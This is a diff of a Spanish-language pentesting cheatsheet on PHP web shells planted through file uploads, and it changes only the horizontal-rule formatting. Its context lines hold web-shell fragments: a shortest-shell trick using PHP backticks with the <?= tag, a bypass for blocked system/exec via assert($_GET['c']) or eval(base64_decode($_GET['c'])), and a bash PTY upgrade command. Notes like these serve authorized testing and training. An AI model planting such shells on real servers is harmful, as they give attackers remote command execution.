@@ -10,7 +10,7 @@ linked:
 ---
 # File Upload - Shells en PHP
 
-***
+---
 
 ## Cheatsheet
 
@@ -80,7 +80,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 # en remoto: export TERM=xterm-256color
 ```
 
-___
+---
 
 ## Overview
 
@@ -94,4 +94,4 @@ PHP backticks `` `cmd` `` + short tag `<?=` = shell más corta posible (`<?= \`$
 
 Si `system`/`exec`/`passthru` bloqueados → `assert($_GET['c'])` o eval con base64 (`eval(base64_decode($_GET['c']))`).
 
-***
+---
